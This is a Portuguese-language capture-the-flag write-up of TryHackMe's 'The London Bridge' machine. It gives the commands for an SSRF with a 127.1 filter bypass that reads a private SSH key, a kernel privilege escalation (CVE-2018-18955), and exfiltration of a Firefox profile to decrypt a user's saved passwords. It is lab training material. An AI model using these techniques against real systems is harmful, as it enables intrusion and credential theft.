<h1>CTF The London Bridge | TryHackMe </h1>

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*RLbxKkKb9fSIR3-k" width="900"  alt="The London Bridge">

- Máquina: The London Bridge
- Dificuldade: Média
- Plataforma: TryHackMe
- Medium: https://medium.com/@henrique.mb/ctf-the-london-bridge-tryhackme-8a1ef5101b62

<h1>Reconhecimento</h1>
Iniciando com a enumeração de portas com a ferramenta nmap, através do comando:

```
nmap -sS -sC -sV 10.201.93.97 -T5 -v
```

Retornando as portas `8080` e `22`:

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*_DJukM22JJJLfbKBIe7w7Q.png" width="1000" alt="Print01">

Ao visitar a aplicação nos deparamos com um página de boas vindas ao Explore London

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*_Cza5RxRYMETwzpCp9OTHQ.png" width="1000" alt="Print02">

Em seguida, foi realizada uma enumeração de diretórios com a ferramenta `gobuster`, através do comando:

```
gobuster dir -u http://gunicorn:8080 -w /usr/share/wordlists/dirb/big.txt -t 100 -r
```

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*qEJOFLbSSoC2wgiUrP9slQ.png" width="1000" alt="Print03">

Visitando o diretório `gallery`, encontramos uma página contribuição onde os visitantes da `London Bridge` enviem suas fotos.

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*TsZKrvMyBp2jMvG8ViUd1w.png" width="1000" alt="Print04">

Ao analisar o código fonte percebemos um comentário sobre a possibilidade de enviar imagens usando uma URL

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*iUYlDz2KQQAjCzz_5ceSRw.png" width="1000" alt="Print05">

Em seguida, visitamos o diretório view_image, vemos que ele não aceita solicitações GET

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZndMICx02XD2f_xdw7CDAQ.png" width="1000" alt="Print06">

Sendo assim, utilizamos a ferramenta de proxy burpsuite para fazer um POST request.

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Zb1SRMazaxi712zUGwsQUg.png" width="1000" alt="Print07">

Assim nos permitindo visualizar o conteúdo da `página`.

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*uR8ceUUqfBU-9xbfFhbdCg.png" width="1000" alt="Print08">

Ao testar o formulário com uma URL para o nosso servidor, vemos que ele usa o parâmetro `image_url`, parece que o aplicativo simplesmente recebe nossa entrada e a exibe usando a tag `img`.

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Y3Pbq_HaajPdqmB9Y3vFFQ.png" width="1000" alt="Print09">

Em seguida, procuramos por outros parâmetros validos com a ferramenta `ffuf`, descobrindo o parâmetro `www` através do comando:

```
ffuf -u 'http://10.201.93.97:8080/view_image' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'FUZZ=http://10.21.16.5/test' -mc all -t 50 -ic -fs 823
```

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ak6o-NcB4M5huYnnxpzXFA.png" width="1000" alt="Print10">

Ao criar o arquivo test e fazer a solicitação manualmente, revela que o servidor não apenas faz a solicitação, mas também retorna a resposta mostrando ser uma vulnerabilidade de SSRF.

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*LPyXAyMNCjBCwpJw-kB-Wg.png" width="1000" alt="Print11">

Ao tentar fazer uma enumeração dos serviços internos, quando usado `127.0.0.1` ou `localhost` na url resulta em um resposta

```
403 FORBIDDEN
```

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*_tZpenUZKkC8BmzwJxOCfA.png" width="1000" alt="Print12">

Ao utilizar a ffuf para enumerar diretórios, descobrimos o diretório `.ssh` com o comando:

```
ffuf -u 'http://10.201.93.97:8080/view_image' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'www=http://127.1/FUZZ' -mc all -t 50 -ic -fs 469
```
<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*lN8vHzX6YHetWN2IU7IvlA.png" width="1000" alt="Print13">

Para ignorar o filtro de url, utilizei o 127.1 para descobrir o que tem no diretório .ssh encontrando dois arquivos

```
id_rsa
authorized_keys
```

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*lXhdsiPswjOhi-X998203g.png" width="1000" alt="Print14">

<h1>Exploração - Obtendo a user flag</h1>

Ao ler o conteúdo do `.ssh/id_rsa` obtemos uma chave privada, com o comando:

```
www=http://127.1/.ssh/id_rsa
```

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*V68R0hCr9tzYaUsPv4lG0w.png" width="1000" alt="Print15">

Em seguida, lemos o conteúdo do *.ssh/authorized_keys*, obtemos um nome de usuário:

```
beth
```

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Rr3NuteJlcaatZfBQm_7BQ.png" width="1000" alt="Print16">

Em seguida, utilizamos a *chave privada* e o nome do *usuário* para acessarmos o serviço *ssh*, com o comando:

```
ssh -i id_rsa beth@10.201.93.97
```

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*yWZoiMDD-OJ_ht30PZXV2g.png" width="1000" alt="Print17">

Encontrando a flag do usuário dentro de `/home/beth/pycache/user.txt`:

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*q1gFPsqNseKJNvRn0uJjBg.png" width="1000" alt="Print18">

<h1>Exploração - Obtendo a root flag</h1>

Em seguida, utilizamos a ferramenta linpeas.sh com o objetivo de encontrar vetores de `escalonamento de privilégios`, onde encontramos a vulnerabilidade

```
[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-     sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled
```

Em seguida, utilizamos alguns exploits encontrados nesse repositório:

```
https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955
```

Após baixar `exploit.dbus.sh`, `rootshell.c`, `subshell.c` e `subuid_shell.c`, e transferi-los para a máquina, executar o exploit nos fornece um `shell`como usuário `root`.

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*IUEFMTmPfCrKyCZ-HaHUKA.png" width="1000" alt="Print19">

Permitindo-nos ler a `flag` do `root` em `/root/.root.txt`

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*85hWCL_jJq9OHh61qAfsLA.png" width="1000" alt="Print20">

<h1>Obtendo a senha do usuário Charles</h1>
Para encontrar a senha do usuário `Charles`, verificamos o diretório inicial do usuário, onde seguimos o caminho dos `diretórios`:

```
/.mozilla/firefox
```

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*U-cAwxj6wU8eFubqNDQa8g.png" width="1000" alt="Print21">

Em seguida, ao encontrar um `diretório` que parece conter `credenciais` onde o arquivamos e transferirmos o diretório firefox para nossa `máquina` via `wget`:


```
root@london:/home/charles/.mozilla# tar -cvzf /tmp/firefox.tar.gz firefox
```

```
wget http://10.201.49.73:8000/firefox.tar.gz
```

Extraindo o arquivo e corrigindo os problemas de `permissão`:

```
tar -xvzf firefox.tar.gz
sudo chmod -R 777 firefox
```

Utilizando o `firefox_decrypt`, obtemos a senha do `usuário` charles:

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*iIlmk9KpFsGUH6XbeVAzqQ.png" width="1000" alt="Print22">
